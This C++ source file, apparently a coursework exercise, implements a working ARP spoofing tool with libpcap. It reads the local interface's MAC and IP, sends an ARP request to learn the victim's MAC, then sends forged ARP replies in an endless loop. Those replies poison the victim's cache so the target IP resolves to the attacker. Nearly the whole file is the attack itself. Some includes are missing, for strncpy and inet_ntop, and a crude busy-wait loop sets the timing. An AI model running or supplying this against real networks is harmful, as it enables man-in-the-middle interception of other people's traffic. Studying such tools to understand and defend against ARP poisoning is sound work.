#include <cstdio>
#include <pcap.h>
#include <sys/ioctl.h>
#include <sys/socket.h>
#include <net/if.h>
#include <unistd.h>

#include "ethhdr.h"
#include "arphdr.h"

#pragma pack(push, 1)
struct EthArpPacket final {
	EthHdr eth_;
	ArpHdr arp_;
};
#pragma pack(pop)

void usage() {
	printf("syntax: send-arp <interface> <sender ip> <target ip>\n");
	printf("sample: send-arp wlan0\n");
}

int main(int argc, char* argv[]) {
	if (argc != 4) {
		usage();
		return -1;
	}

	char* dev = argv[1];
	char errbuf[PCAP_ERRBUF_SIZE];
	pcap_t* handle = pcap_open_live(dev, BUFSIZ, 1, 1, errbuf);
	if (handle == nullptr) {
		fprintf(stderr, "error: couldn't open device %s(%s)\n", dev, errbuf);
		return -1;
	}


	//get my Mac & Ip
	int fd = socket(AF_INET, SOCK_STREAM, 0);
	if(fd < 0){
		fprintf(stderr, "error: socket()\n");
		return -1;
	}
	
	struct ifreq ifr;
	strncpy(ifr.ifr_name, argv[1], IFNAMSIZ);
	
	int chk = ioctl(fd, SIOCGIFHWADDR, &ifr);	//get my Mac
	if(chk < 0){
		fprintf(stderr, "error: ioctl()\n");
		close(fd);
		return -1;
	}
	unsigned char* my_Mac = (unsigned char*)ifr.ifr_hwaddr.sa_data;
	
	chk = ioctl(fd, SIOCGIFADDR, &ifr);	//get my Ip
	if(chk < 0){
		fprintf(stderr, "error: ioctl()\n");
		close(fd);
		return -1;
	}
	char my_Ip[40];
	inet_ntop(AF_INET, ifr.ifr_addr.sa_data+2, my_Ip, sizeof(struct sockaddr));
	
	close(fd);
	fprintf(stdout, "success: get my Mac & Ip\n");
	

	//get sender Mac
	EthArpPacket normal_packet;

	normal_packet.eth_.smac_ = Mac(my_Mac);
	normal_packet.eth_.dmac_ = Mac("ff:ff:ff:ff:ff:ff");
	normal_packet.eth_.type_ = htons(EthHdr::Arp);

	normal_packet.arp_.hrd_ = htons(ArpHdr::ETHER);
	normal_packet.arp_.pro_ = htons(EthHdr::Ip4);
	normal_packet.arp_.hln_ = Mac::SIZE;
	normal_packet.arp_.pln_ = Ip::SIZE;
	normal_packet.arp_.op_ = htons(ArpHdr::Request);
	normal_packet.arp_.smac_ = Mac(my_Mac);
	normal_packet.arp_.sip_ = htonl(Ip(my_Ip));
	normal_packet.arp_.tmac_ = Mac("00:00:00:00:00:00");
	normal_packet.arp_.tip_ = htonl(Ip(argv[2]));
	
	int res = pcap_sendpacket(handle, reinterpret_cast<const u_char*>(&normal_packet), sizeof(EthArpPacket));
	if (res != 0) {
		fprintf(stderr, "error: pcap_sendpacket return %d error=%s\n", res, pcap_geterr(handle));
	}
	
	Mac sender_Mac;
	while(1){
		struct pcap_pkthdr* header;
		const u_char* packet;
		int res = pcap_next_ex(handle, &header, &packet);
		if (res == 0) continue;
		if (res == PCAP_ERROR || res == PCAP_ERROR_BREAK) {
			printf("error: pcap_next_ex return %d(%s)\n", res, pcap_geterr(handle));
			break;
		}
		
		EthHdr* ether = (EthHdr*)packet;
		if(ether->type_ != htons(EthHdr::Arp)) continue;
		ArpHdr* arp = (ArpHdr*)(packet + sizeof(EthHdr));
		if(arp->op_ != htons(ArpHdr::Reply) || arp->sip_ != htonl(Ip(argv[2]))) continue;
		
		sender_Mac = arp->smac_;
		break;
	}
	fprintf(stdout, "success: get sender's Mac\n");
	
	
	//arp spoofing
	EthArpPacket bad_packet;

	bad_packet.eth_.smac_ = Mac(my_Mac);
	bad_packet.eth_.dmac_ = Mac(sender_Mac);
	bad_packet.eth_.type_ = htons(EthHdr::Arp);

	bad_packet.arp_.hrd_ = htons(ArpHdr::ETHER);
	bad_packet.arp_.pro_ = htons(EthHdr::Ip4);
	bad_packet.arp_.hln_ = Mac::SIZE;
	bad_packet.arp_.pln_ = Ip::SIZE;
	bad_packet.arp_.op_ = htons(ArpHdr::Reply);
	bad_packet.arp_.smac_ = Mac(my_Mac);
	bad_packet.arp_.sip_ = htonl(Ip(argv[3]));
	bad_packet.arp_.tmac_ = Mac(sender_Mac);
	bad_packet.arp_.tip_ = htonl(Ip(argv[2]));
	
	while(1){
		int res = pcap_sendpacket(handle, reinterpret_cast<const u_char*>(&bad_packet), sizeof(EthArpPacket));
		if (res != 0) {
			fprintf(stderr, "error: pcap_sendpacket return %d error=%s\n", res, pcap_geterr(handle));
		}
		fprintf(stdout, "spoofing...\n");
		int timer=500000000;
		while(timer--);
	}
	
	pcap_close(handle);
}
